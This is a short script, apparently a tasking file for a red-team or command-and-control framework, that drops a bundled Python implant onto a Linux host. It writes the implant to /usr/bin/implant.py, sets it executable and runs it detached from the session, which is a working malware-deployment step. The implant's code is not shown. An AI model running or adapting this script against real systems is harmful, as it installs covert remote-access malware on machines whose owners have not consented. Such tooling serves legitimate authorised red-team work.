load("assets", importAsset="load")
load("sys", "write", "chmod", "exec")

dst = "/usr/bin/implant.py"
implant = importAsset("/linux/implants/implant.py")

def main():
    write(dst, implant)
    chmod(dst, ownerRead=True, ownerWrite=True, ownerExec=True, groupRead=True, worldRead=True)
  
    exec("python3 "+dst, disown=True)





    